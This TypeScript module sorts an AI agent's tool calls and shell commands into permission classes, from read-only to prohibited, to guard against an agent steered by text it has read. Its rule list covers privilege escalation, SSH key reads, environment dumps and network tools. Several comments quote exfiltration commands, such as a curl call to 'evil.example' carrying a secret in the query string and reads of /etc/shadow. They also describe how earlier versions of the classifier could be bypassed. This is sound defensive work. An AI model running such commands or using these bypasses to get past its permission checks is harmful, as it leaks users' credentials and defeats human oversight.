import type { PermissionClass, PermissionClassification } from '../types/permissions.js';
import { redactText } from './redaction.js';
import { fileURLToPath } from 'node:url';
import type { FilesystemScope } from './paths.js';

/**
 * Maps a proposed tool call onto a permission class.
 *
 * The threat model is not a malicious user — it is an LLM acting on ambiguous
 * instructions, possibly influenced by text it read in a repository or on the
 * web. So classification is deliberately pessimistic: anything unrecognised is
 * treated as more dangerous than the baseline, never less.
 */

const CLASS_SEVERITY: Record<PermissionClass, number> = {
  READ_ONLY: 0,
  LOCAL_REVERSIBLE: 1,
  EXTERNAL_SIDE_EFFECT: 2,
  DESTRUCTIVE: 3,
  PROHIBITED: 4,
};

export function maxClass(a: PermissionClass, b: PermissionClass): PermissionClass {
  return CLASS_SEVERITY[a] >= CLASS_SEVERITY[b] ? a : b;
}

/** Tools that only ever read. */
const READ_ONLY_TOOLS = new Set([
  'Read',
  'Glob',
  'Grep',
  'NotebookRead',
  'TodoWrite',
  'WebSearch',
  'WebFetch',
  'Task',
  'Agent',
  'BashOutput',
  'ListMcpResources',
  'ReadMcpResource',
]);

/** Tools that modify files in place. */
const WRITE_TOOLS = new Set(['Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'ApplyPatch']);

/**
 * Tools that change only the session's own control state.
 *
 * These exist because the previous commit made an unrecognised tool ASK, which
 * is the right default and immediately mis-fired on the SDK's control verbs.
 * The worker is started with `permissionMode: 'plan'` for inspect sessions, so
 * ExitPlanMode is a designed-in step of a normal session -- prompting the user
 * to approve the model finishing its plan is not a security boundary, it is a
 * papercut that teaches people to tap Allow without reading.
 *
 * Verified against the installed SDK's own declarations rather than guessed:
 * node_modules/@anthropic-ai/claude-agent-sdk/sdk-tools.d.ts lists these names.
 * Nothing here touches the filesystem, the network, or any state outside this
 * process; anything that does must stay out of this set and be classified on
 * what it actually does.
 */
const CONTROL_TOOLS = new Set(['EnterPlanMode', 'ExitPlanMode', 'KillShell', 'KillBash']);

/**
 * Shell control operators that start a NEW command. Splitting on these is what
 * stops `ls && rm -rf ~` from being classified by its harmless prefix.
 */
const COMMAND_SEPARATORS = /(?:\|\||&&|;|\||\n|&(?!>))/g;

/** Command-substitution forms whose contents also have to be classified. */
const SUBSTITUTION = /\$\(([^)]*)\)|`([^`]*)`|<\(([^)]*)\)/g;

interface Rule {
  re: RegExp;
  class: PermissionClass;
  reason: string;
}

/**
 * Ordered most-dangerous-first; the first match on a segment wins, and the
 * worst match across all segments wins overall.
 */
const BASH_RULES: Rule[] = [
  // ---- prohibited by default: security controls and secret exposure
  { re: /\bsudo\b|\bdoas\b|\bpkexec\b/, class: 'PROHIBITED', reason: 'privilege escalation' },
  { re: /authorized_keys|\bssh-add\b|(^|\s)~?\/?\.ssh\//, class: 'PROHIBITED', reason: 'SSH credential modification' },
  { re: /\b(printenv|env)\b(?!\s+[A-Z_]+=)\s*$|\bset\s*$|\bexport\s*-p\b/, class: 'PROHIBITED', reason: 'dumps the environment, which may contain secrets' },
  { re: /\bcat\b[^|;]*\.(pem|key|p12|pfx)\b|id_rsa|id_ed25519/, class: 'PROHIBITED', reason: 'reads a private key' },
  { re: /\b(iptables|ufw|firewall-cmd|setenforce)\b/, class: 'PROHIBITED', reason: 'firewall or security policy change' },

  // ---- destructive
  { re: /\brm\b[^|;]*\s-[a-zA-Z]*[rR][a-zA-Z]*f|\brm\b[^|;]*\s-[a-zA-Z]*f[a-zA-Z]*[rR]/, class: 'DESTRUCTIVE', reason: 'recursive force delete' },
  { re: /\bgit\b[^|;]*\bpush\b[^|;]*(--force\b|--force-with-lease\b|\s-f\b)/, class: 'DESTRUCTIVE', reason: 'force push rewrites published history' },
  { re: /\bgit\b[^|;]*\b(reset\s+--hard|clean\s+-[a-zA-Z]*[dfx])/, class: 'DESTRUCTIVE', reason: 'discards uncommitted work' },
  { re: /\b(drop|truncate)\s+(database|table|schema)\b/i, class: 'DESTRUCTIVE', reason: 'destructive database statement' },
  { re: /\b(mkfs|fdisk|parted)\b|\bdd\b[^|;]*\bof=\/dev\//, class: 'DESTRUCTIVE', reason: 'writes to a block device' },
  { re: /\bgit\b[^|;]*\bbranch\b[^|;]*\s-D\b|\bgh\b[^|;]*\brepo\s+delete\b/, class: 'DESTRUCTIVE', reason: 'deletes a branch or repository' },
  { re: /\b(shutdown|reboot|halt|poweroff)\b/, class: 'DESTRUCTIVE', reason: 'host power state change' },
  { re: /\bchown\b|\bchmod\b\s+(777|-R\s+777)/, class: 'DESTRUCTIVE', reason: 'ownership or broad permission change' },

  // ---- external side effects
  { re: /\bgit\b[^|;]*\bpush\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'publishes commits to a remote' },
  { re: /\bnpm\b[^|;]*\bpublish\b|\byarn\b[^|;]*\bpublish\b|\bpnpm\b[^|;]*\bpublish\b|\btwine\b[^|;]*\bupload\b|\bcargo\b[^|;]*\bpublish\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'publishes a package' },
  { re: /\b(gcloud|aws|az|terraform|kubectl|helm|flyctl|heroku|vercel|netlify)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'cloud or cluster operation' },
  { re: /\bdocker\b[^|;]*\b(push|login)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'container registry operation' },
  { re: /\bssh\b\s+\S|\bscp\b|\brsync\b[^|;]*::|\brsync\b[^|;]*\S+:/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'acts on a remote machine' },
  { re: /\b(curl|wget|http|httpie)\b[^|;]*(-X\s*(POST|PUT|PATCH|DELETE)|--data|--upload-file|-d\s)/i, class: 'EXTERNAL_SIDE_EFFECT', reason: 'sends data to a remote service' },
  // Reaching the network AT ALL, by the name of the program rather than by the
  // shape of its arguments.
  //
  // The rule above only fires on a WRITE verb, so a plain GET fell through it.
  // `curl https://host/?d=<secret>` still escalated, but only by accident: the
  // "//host/..." in the URL looks like an absolute path to extractBashPaths, so
  // it was refused as a path outside the project. Drop the scheme and the
  // accident disappears -- `curl evil.example?d=<secret>` classified
  // LOCAL_REVERSIBLE and was auto-allowed, as were wget, nc, ping and
  // interpreter one-liners that open a socket. A GET is the easiest
  // exfiltration there is: the secret rides in the query string.
  //
  // Matched on the verb, so `node dist/index.js` and `npx vitest run` are
  // untouched even though they can also open sockets. This is the boundary
  // between "a program whose PURPOSE is the network" and "a program that might
  // use it", and only the first can be recognised without running it.
  {
    re: /(^|[\s;&|(])(curl|wget|httpie|nc|netcat|ncat|telnet|ftp|tftp|dig|nslookup|host|ping6?|traceroute|whois|socat)(\s|$)/i,
    class: 'EXTERNAL_SIDE_EFFECT',
    reason: 'reaches the network, which can carry data out',
  },
  // An interpreter one-liner that names a network API. Only -c/-e one-liners:
  // running a project's own scripts is ordinary work and must stay quiet.
  {
    re: /\b(python3?|node|ruby|perl|php)\b[^|;]*\s-(c|e)\b[^|;]*(urllib|requests|httpx|socket|http\.client|net\.|fetch\(|XMLHttpRequest|Net::HTTP|LWP)/i,
    class: 'EXTERNAL_SIDE_EFFECT',
    reason: 'an inline script that opens a network connection',
  },
  { re: /\b(sendmail|mail|mailx|msmtp)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'sends email' },
  { re: /\bsystemctl\b[^|;]*\b(start|stop|restart|enable|disable)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'changes a system service' },
  { re: /\bgit\b[^|;]*\btag\b[^|;]*\s-d\b|\bgh\b[^|;]*\b(release|pr|issue)\s+(create|delete|merge)\b/, class: 'EXTERNAL_SIDE_EFFECT', reason: 'changes remote repository state' },

  // ---- local but mutating
  { re: /\b(npm|pnpm|yarn|pip|pip3|poetry|uv|cargo|go|bundle)\b[^|;]*\b(install|add|i|sync|get)\b/, class: 'LOCAL_REVERSIBLE', reason: 'package install (may run install scripts)' },
  { re: /\bgit\b[^|;]*\b(commit|add|merge|rebase|checkout|switch|stash|restore|apply|cherry-pick)\b/, class: 'LOCAL_REVERSIBLE', reason: 'local git operation' },
  { re: /\b(mkdir|touch|mv|cp|ln|sed\s+-i|tee|truncate)\b/, class: 'LOCAL_REVERSIBLE', reason: 'modifies files' },
  { re: /\brm\b/, class: 'LOCAL_REVERSIBLE', reason: 'deletes files' },
  { re: /\b(make|cmake|gradle|gradlew|mvn|tsc|webpack|vite|next|esbuild)\b/, class: 'LOCAL_REVERSIBLE', reason: 'build step' },
  { re: /\b(npm|pnpm|yarn)\b[^|;]*\b(run|test|exec)\b|\b(pytest|vitest|jest|mocha|go\s+test|cargo\s+test)\b/, class: 'LOCAL_REVERSIBLE', reason: 'runs project scripts or tests' },

  // ---- read-only
  { re: /\bgit\b[^|;]*\b(status|diff|log|show|branch|remote|rev-parse|describe|blame|ls-files)\b/, class: 'READ_ONLY', reason: 'git inspection' },
  { re: /^\s*(ls|cat|head|tail|grep|rg|find|fd|wc|file|stat|pwd|which|whoami|date|df|du|ps|top|uname|echo|jq|sort|uniq|tree|less|diff)\b/, class: 'READ_ONLY', reason: 'inspection command' },
];

/** Split a shell command into independently-classified segments. */
export function splitShellSegments(command: string): string[] {
  const segments: string[] = [];

  // Command substitutions are separate commands; pull them out and classify
  // them too, rather than letting them hide inside an innocuous-looking line.
  let remaining = command;
  for (const match of command.matchAll(SUBSTITUTION)) {
    const inner = match[1] ?? match[2] ?? match[3];
    if (inner && inner.trim() !== '') segments.push(inner.trim());
  }
  remaining = remaining.replace(SUBSTITUTION, ' ');

  for (const part of remaining.split(COMMAND_SEPARATORS)) {
    const trimmed = part?.trim();
    if (trimmed) segments.push(trimmed);
  }
  return segments.length > 0 ? segments : [command.trim()];
}

function classifyBashSegment(segment: string): { class: PermissionClass; reason: string } {
  for (const rule of BASH_RULES) {
    if (rule.re.test(segment)) return { class: rule.class, reason: rule.reason };
  }
  // Unrecognised commands are NOT assumed safe. Local-reversible is the floor
  // because an unknown binary can certainly write files.
  return { class: 'LOCAL_REVERSIBLE', reason: 'unrecognised command' };
}

export function classifyBashCommand(command: string): { class: PermissionClass; reason: string } {
  const segments = splitShellSegments(command);
  let worst: PermissionClass = 'READ_ONLY';
  let reason = 'inspection command';
  for (const segment of segments) {
    const result = classifyBashSegment(segment);
    if (CLASS_SEVERITY[result.class] > CLASS_SEVERITY[worst]) {
      worst = result.class;
      reason = result.reason;
    }
  }
  return { class: worst, reason };
}

/**
 * Paths that are routinely referenced by ordinary build/test commands and are
 * not interesting to protect. Keeping this list small and read-only-ish avoids
 * drowning the user in approval prompts for `/usr/bin/env`.
 */
const BENIGN_PATH_PREFIXES = [
  '/usr/',
  '/bin/',
  '/sbin/',
  '/lib/',
  '/lib64/',
  '/opt/',
  '/proc/',
  '/sys/',
  '/dev/null',
  '/dev/stdout',
  '/dev/stderr',
  '/etc/ssl/',
  '/tmp/',
  '/var/tmp/',
];

/** Locations whose contents are credentials or system control surfaces. */
const SENSITIVE_PATH_PATTERN =
  // /proc/<pid>/ is here rather than merely absent from BENIGN_PATH_PREFIXES
  // because the sensitive test runs FIRST, so it wins over the /proc/ prefix
  // that keeps /proc/cpuinfo usable. /proc/self/environ dumps the worker's
  // environment -- every token this process holds -- and was classified
  // READ_ONLY and auto-allowed, while the explicit rule on `env` and `printenv`
  // called the same information PROHIBITED. Both cannot be right.
  /(\/\.ssh\/|\/\.aws\/|\/\.gnupg\/|\/\.config\/gcloud|\/\.kube\/|authorized_keys|id_rsa|id_ed25519|(^|[\s/])etc\/(shadow|passwd|sudoers)|\/root\/|\/proc\/(self|thread-self|[0-9]+)\/|\.pem$|\.p12$|\.pfx$|(^|\/)\.env(\.|$))/;

/**
 * Pull filesystem paths out of a shell command.
 *
 * This is a heuristic, not a shell parser: it finds absolute and `~` paths in
 * argument position. It exists because a Bash call can otherwise touch any file
 * on the machine while being classified purely on its verb, which would let
 * `cat /home/other/private/notes` through as an "inspection command". The
 * worker's own permission layer remains the second line of defence.
 */
export function extractBashPaths(command: string): string[] {
  const paths: string[] = [];
  const pattern = /(?:^|[\s"'=:(])((?:~|\/)[A-Za-z0-9._~\-\/]*)/g;
  for (const match of command.matchAll(pattern)) {
    const candidate = match[1];
    if (candidate === undefined || candidate.length < 2) continue;
    paths.push(candidate);
  }
  return paths;
}

/**
 * Relative paths that climb out of the working directory.
 *
 * extractBashPaths only matches absolute and `~` paths, so
 * `cat ../../../../etc/passwd` yielded NO paths at all and was classified
 * READ_ONLY on the strength of the verb alone. The worker's cwd is the project
 * directory, so any `..` segment is a path that may leave the project, and this
 * classifier has no cwd with which to resolve it -- which is the argument for
 * asking rather than for guessing.
 */
export function extractBashRelativePaths(command: string): string[] {
  const paths: string[] = [];
  const pattern = /(?:^|[\s"'=:(<>|])((?:\.\.\/)+[A-Za-z0-9._~\-/]*|\.\.)(?=$|[\s"';)&|])/g;
  for (const match of command.matchAll(pattern)) {
    const candidate = match[1];
    if (candidate !== undefined) paths.push(candidate);
  }
  return paths;
}

/**
 * Paths built out of a shell variable, which cannot be resolved here at all.
 *
 * `awk '{print}' $HOME/.gnupg/secring.gpg` extracted nothing and was
 * auto-allowed. Only a variable immediately followed by a slash counts, so
 * `echo $PATH` and `$(date)` are left alone: the point is to catch a path whose
 * value this process cannot know, not to escalate every use of a variable.
 */
export function extractBashUnresolvablePaths(command: string): string[] {
  const paths: string[] = [];
  const pattern = /\$\{?[A-Za-z_][A-Za-z0-9_]*\}?\/[A-Za-z0-9._~\-/${}]*/g;
  for (const match of command.matchAll(pattern)) paths.push(match[0]);
  return paths;
}

function isBenignPath(path: string): boolean {
  return BENIGN_PATH_PREFIXES.some((prefix) => path === prefix.replace(/\/$/, '') || path.startsWith(prefix));
}

/**
 * Escalate a Bash command's class when it references files outside the
 * permitted scope. Sensitive targets are refused outright; anything else merely
 * needs approval rather than being blocked, so ordinary work is not disrupted.
 */
function escalateForBashPaths(
  command: string,
  scope: FilesystemScope,
  base: { class: PermissionClass; reason: string },
): { class: PermissionClass; reason: string } {
  let result = base;
  for (const rawPath of extractBashPaths(command)) {
    if (SENSITIVE_PATH_PATTERN.test(rawPath)) {
      return { class: 'PROHIBITED', reason: `references a sensitive location (${rawPath})` };
    }
    if (isBenignPath(rawPath)) continue;
    if (rawPath.startsWith('~')) {
      return { class: 'PROHIBITED', reason: `references the home directory outside the project (${rawPath})` };
    }
    if (!scope.check(rawPath, 'read').allowed) {
      result = {
        class: maxClass(result.class, 'EXTERNAL_SIDE_EFFECT'),
        reason: `touches a path outside the permitted project scope (${rawPath})`,
      };
    }
  }

  // Paths this classifier cannot resolve: relative ones (no cwd here) and ones
  // assembled from a shell variable (no environment here). Neither can be
  // scope-checked, so neither may be auto-allowed on the strength of the verb.
  for (const rawPath of [...extractBashRelativePaths(command), ...extractBashUnresolvablePaths(command)]) {
    if (SENSITIVE_PATH_PATTERN.test(rawPath)) {
      return { class: 'PROHIBITED', reason: `references a sensitive location (${rawPath})` };
    }
    result = {
      class: maxClass(result.class, 'EXTERNAL_SIDE_EFFECT'),
      reason: `references a path this system cannot resolve, so its scope cannot be checked (${rawPath})`,
    };
  }

  // Last resort: a sensitive location named anywhere in the command line, even
  // where no extractor can see it as a path. `tar -czf /tmp/x.tgz -C / etc/shadow`
  // reads the shadow file through a BARE relative argument, and extracting every
  // bare relative token is not possible -- in a shell command every word looks
  // like one. So the whole string is scanned, and the result is escalated to
  // approval rather than refused: unlike an extracted path, a match here may be
  // an honest mention, such as `grep -rn authorized_keys docs/`. (A private key
  // named anywhere is already PROHIBITED outright by a rule above, so this
  // escalation never weakens that.)
  if (SENSITIVE_PATH_PATTERN.test(command)) {
    result = {
      class: maxClass(result.class, 'EXTERNAL_SIDE_EFFECT'),
      reason: 'names a sensitive location somewhere in the command line',
    };
  }
  return result;
}

/** Best-effort extraction of filesystem paths a tool call would touch. */
export function extractPaths(toolName: string, input: Record<string, unknown>): string[] {
  const paths: string[] = [];
  for (const key of ['file_path', 'path', 'notebook_path', 'filePath', 'target_file']) {
    const value = input[key];
    if (typeof value === 'string' && value !== '') paths.push(value);
  }
  // A file:// URL is a filesystem read wearing a URL. WebFetch is classified
  // READ_ONLY and takes a `url`, not a `file_path`, so nothing was extracted
  // and nothing was scope-checked.
  const url = input['url'];
  if (typeof url === 'string' && /^file:\/\//i.test(url)) {
    try {
      paths.push(fileURLToPath(url));
    } catch {
      paths.push(url);
    }
  }
  if (toolName === 'Glob' || toolName === 'Grep') {
    const value = input['path'];
    if (typeof value === 'string' && value !== '') paths.push(value);
  }
  return paths;
}

export interface ClassifyOptions {
  toolName: string;
  input: Record<string, unknown>;
  scope: FilesystemScope;
  /** Path the SDK reported as blocked, when it supplied one. */
  blockedPath?: string;
}

export function classifyToolCall(options: ClassifyOptions): PermissionClassification {
  const { toolName, input, scope } = options;
  const paths = extractPaths(toolName, input);
  if (options.blockedPath) paths.push(options.blockedPath);

  // MCP tools from other servers are opaque to us. Treat them as external.
  if (toolName.startsWith('mcp__')) {
    return {
      class: 'EXTERNAL_SIDE_EFFECT',
      reason: 'tool provided by another MCP server; effects are not inspectable here',
      summary: `Use MCP tool ${toolName}`,
      ...(paths.length > 0 ? { paths } : {}),
    };
  }

  if (toolName === 'Bash' || toolName === 'BashCommand') {
    const command = typeof input['command'] === 'string' ? input['command'] : '';
    const { class: cls, reason } = escalateForBashPaths(command, scope, classifyBashCommand(command));
    return {
      class: cls,
      reason,
      summary: `Run: ${redactText(command).slice(0, 200)}`,
      ...(paths.length > 0 ? { paths } : {}),
    };
  }

  // A sensitive location is sensitive whichever tool opens it. This check used
  // to live only in escalateForBashPaths, so `cat /project/.env` was PROHIBITED
  // while Read of the same file was READ_ONLY and auto-allowed -- the weaker
  // path being the one a model reaches for first. deniedPaths defaults to
  // empty, so nothing else stood in the way.
  for (const path of paths) {
    if (SENSITIVE_PATH_PATTERN.test(path)) {
      return {
        class: 'PROHIBITED',
        reason: `references a sensitive location (${path})`,
        summary: `${toolName} ${path}`,
        paths,
      };
    }
  }

  if (WRITE_TOOLS.has(toolName)) {
    // A write outside the permitted scope is not merely "destructive"; it is
    // outside what this system is allowed to do at all.
    for (const path of paths) {
      const decision = scope.check(path, 'write');
      if (!decision.allowed) {
        return {
          class: 'PROHIBITED',
          reason: decision.reason ?? 'write outside permitted filesystem scope',
          summary: `Write to ${path}`,
          paths,
        };
      }
    }
    return {
      class: 'LOCAL_REVERSIBLE',
      reason: 'edits a file inside the project',
      summary: `${toolName} ${paths[0] ?? '(file)'}`,
      ...(paths.length > 0 ? { paths } : {}),
    };
  }

  if (CONTROL_TOOLS.has(toolName)) {
    return {
      class: 'READ_ONLY',
      reason: 'changes only this session\'s own control state',
      summary: `${toolName}`,
      ...(paths.length > 0 ? { paths } : {}),
    };
  }

  if (toolName === 'SlashCommand') {
    // The invocation itself grants nothing: a slash command expands to a
    // prompt, and every tool call that expansion makes comes back through this
    // classifier on its own merits. Local-reversible because the expansion
    // usually does edit the project.
    return {
      class: 'LOCAL_REVERSIBLE',
      reason: 'runs a user-defined command whose own tool calls are classified individually',
      summary: `SlashCommand`,
      ...(paths.length > 0 ? { paths } : {}),
    };
  }

  if (READ_ONLY_TOOLS.has(toolName)) {
    for (const path of paths) {
      const decision = scope.check(path, 'read');
      if (!decision.allowed) {
        return {
          class: 'PROHIBITED',
          reason: decision.reason ?? 'read outside permitted filesystem scope',
          summary: `Read ${path}`,
          paths,
        };
      }
    }
    return {
      class: 'READ_ONLY',
      reason: 'inspection only',
      summary: `${toolName}${paths[0] ? ` ${paths[0]}` : ''}`,
      ...(paths.length > 0 ? { paths } : {}),
    };
  }

  // Fail closed. An unrecognised tool was auto-allowed as LOCAL_REVERSIBLE,
  // which means any tool a future SDK release adds is permitted by default
  // until somebody notices and classifies it. Asking is the cost of not
  // knowing what it does; the alternative is granting an unknown capability
  // silently.
  return {
    class: 'EXTERNAL_SIDE_EFFECT',
    reason: `unrecognised tool "${toolName}"; its effects are not known to this classifier`,
    summary: `Use ${toolName}`,
    ...(paths.length > 0 ? { paths } : {}),
  };
}
